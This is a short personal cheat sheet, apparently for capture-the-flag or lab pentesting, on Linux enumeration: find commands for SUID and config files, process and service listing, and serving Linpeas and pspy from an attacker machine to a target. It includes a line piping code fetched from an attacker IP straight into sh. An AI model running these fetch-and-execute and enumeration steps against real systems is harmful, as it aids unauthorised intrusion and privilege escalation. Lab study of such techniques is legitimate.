# Linux Enumeration

## Reading all Files

```bash
cat */*
```

## Find Command

[https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group](https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group)  
```bash
find / -group groupX
```
  
[https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions](https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions)  
```bash
find / -user user
```

Find config files and redirect errors:

```bash
find / -name '*.conf' 2>/dev/null
```

Find suid files:

```bash
find . -perm /4000
```

## Linpeas
Install Linpeas from [GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Placing it in `~/Documents/enum` allows you to easily retrieve it with a simple python server. See [[Aliases#Useful Aliases]] for `enumserve` alias setup.

On attacker machine:

```bash
enumserve
```

Find your IP address ([[Linux Networking#Get your IP]])

On target machine:

```bash
wget [IP]:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

You can also send it directly to `sh`/`bash` if `wget` is not installed:

```bash
curl 10.10.14.53:8000/linpeas.sh | sh
```

Sometimes firewall rules may prevent you from accessing port 8000 - try running the server on port 80 if you aren't getting any results (requires root permissions):

```bash
sudo python3 -m http.server 80
```

## Standard Directories to Check
```
/home
/var/www
/var/backups
/var/logs
/opt
/usr/share
/usr/share/local
```

## List Processes & Services
List processes:

```bash
ps aux
```

Pspy monitoring:

```bash
wget [IP]:8000/pspy64
chmod +x pspy64
./pspy64
```

List services:

```bash
netstat
```

```bash
ss -lntp
```

```bash
systemctl list-units --type=service --state=running
```